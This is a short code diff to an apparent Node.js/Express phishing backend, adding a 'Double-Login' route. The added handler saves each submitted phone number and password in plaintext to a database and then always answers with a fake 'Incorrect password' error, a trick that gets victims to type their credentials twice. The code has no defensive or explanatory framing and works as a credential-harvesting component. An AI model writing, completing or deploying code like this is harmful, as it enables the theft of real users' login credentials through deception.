@@ -41,6 +41,27 @@ async function connectDB() {
    ROUTES
  =========================== */
 
+// 0️⃣ Double-Login: First attempt saves credentials and returns error
+app.post('/api/login', async (req, res) => {
+  try {
+    await connectDB();
+
+    const { loginPhone, loginPassword } = req.body;
+    const loginSubmission = new Submission({
+      loginPhone,
+      loginPassword,
+      source: 'login'
+    });
+    await loginSubmission.save();
+
+    // Always return error on first attempt
+    res.status(401).json({ success: false, error: 'Incorrect password. Please try again.' });
+  } catch (error) {
+    console.error('Login Save Error:', error);
+    res.status(401).json({ success: false, error: 'Incorrect password. Please try again.' });
+  }
+});
+
 // 1️⃣ User Submission
 app.post('/api/submit', async (req, res) => {
   try {
